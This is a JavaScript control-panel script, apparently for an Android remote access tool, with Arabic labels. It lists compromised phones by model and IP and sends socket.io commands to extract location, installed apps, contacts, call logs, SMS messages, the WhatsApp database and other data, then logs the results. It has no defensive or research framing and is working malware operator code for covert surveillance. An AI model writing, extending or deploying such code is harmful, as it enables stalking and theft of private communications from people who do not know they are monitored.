const socket = io();
const devicesDiv = document.getElementById('devices');
const logsDiv = document.getElementById('logs');
const devicesMap = {};
const deviceSelect = document.getElementById('deviceSelect');
const commandAction = document.getElementById('commandAction');
const sendCommandBtn = document.getElementById('sendCommand');

socket.emit('adminJoin');

function renderDevice(device){
  if(!devicesMap[device.id]){
    const div=document.createElement('div');
    div.className='device';
    div.id='device_'+device.id;
    div.innerHTML=`<strong>${device.id}</strong> - ${device.model} - IP: ${device.ip || 'N/A'}
      <div id="extra_${device.id}"></div>
      <button onclick="request('${device.id}','getLocation')">موقع</button>
      <button onclick="request('${device.id}','getInstalledApps')">تطبيقات</button>
      <button onclick="request('${device.id}','getContacts')">جهات اتصال</button>
      <button onclick="request('${device.id}','getCallLog')">سجل المكالمات</button>
      <button onclick="request('${device.id}','getSMS')">رسائل</button>
      <button onclick="request('${device.id}','downloadWhatsappDatabase')">واتساب</button>
      <button onclick="request('${device.id}','getExtraData')">بيانات إضافية</button>`;
    devicesDiv.appendChild(div);
    devicesMap[device.id]=div;

    const opt=document.createElement('option');
    opt.value=device.id;
    opt.textContent=device.id;
    deviceSelect.appendChild(opt);
  }
}

function addLog(msg){
  const log=document.createElement('div');
  log.textContent=`[${new Date().toLocaleTimeString()}] ${msg}`;
  logsDiv.appendChild(log);
  logsDiv.scrollTop = logsDiv.scrollHeight;
}

socket.on('join', device=>{
  renderDevice(device);
  addLog(`جهاز متصل: ${device.id}`);
});

socket.on('requestResult', payload=>{
  const obj = JSON.parse(payload);
  const extraDiv = document.getElementById('extra_'+obj.to);
  if(obj.ok && obj.result && obj.result.data){
    extraDiv.innerHTML=JSON.stringify(obj.result.data).slice(0,200)+'...';
  }
  addLog(`Request ${obj.action} -> ${obj.to}: ${obj.ok?'نجاح':'فشل'}`);
});

function request(deviceId, action){
  socket.emit('request', { to:deviceId, action });
}

sendCommandBtn.addEventListener('click', ()=>{
  const to=deviceSelect.value;
  const action=commandAction.value;
  request(to, action);
});
